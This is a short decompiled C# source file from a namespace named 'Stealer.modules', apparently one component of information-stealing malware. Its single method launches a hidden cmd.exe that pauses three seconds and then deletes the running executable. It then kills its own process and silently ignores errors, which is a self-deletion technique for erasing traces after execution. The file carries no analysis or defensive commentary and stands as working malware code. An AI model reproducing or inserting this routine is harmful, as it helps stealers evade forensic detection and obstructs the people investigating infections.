using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Stealer.modules
{
	// Token: 0x02000039 RID: 57
	public class Delete
	{
		// Token: 0x06000136 RID: 310 RVA: 0x0000DD78 File Offset: 0x0000BF78
		public static void SelfDelete()
		{
			try
			{
				Process.Start(new ProcessStartInfo
				{
					Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe"
				}).Dispose();
				Process.GetCurrentProcess().Kill();
			}
			catch
			{
			}
		}
	}
}
